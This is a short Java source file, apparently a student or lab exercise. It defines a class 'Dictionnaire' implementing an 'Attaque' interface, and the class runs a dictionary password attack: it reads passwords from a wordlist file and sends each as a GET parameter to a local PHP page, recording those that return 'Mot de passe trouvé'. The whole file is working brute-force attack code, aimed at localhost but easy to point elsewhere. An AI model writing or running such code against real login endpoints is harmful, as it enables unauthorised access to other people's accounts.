import java.util.*;
import java.io.*;
import java.net.*;

public class Dictionnaire implements Attaque {
    public Dictionnaire() {
    }

    public ArrayList<String> CreerAttaque() {
        ArrayList<String> validPasswords = new ArrayList<String>();
        File dictionnaire = new File("dictionnaire.txt");
        
        try (Scanner ligne = new Scanner(dictionnaire)) {
            while (ligne.hasNextLine()) {
                String password = ligne.nextLine();
                try {
                    URL url = new URL("http://localhost/dossier/User.php?password=" + password);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    try (BufferedReader in = new BufferedReader(
                            new InputStreamReader(connection.getInputStream()))) {
                        String line;
                        while ((line = in.readLine()) != null) {
                            System.out.println(line);
                            if (line.equals("Mot de passe trouvé")) {
                                validPasswords.add(password);
                            }
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        return validPasswords;
    }
}
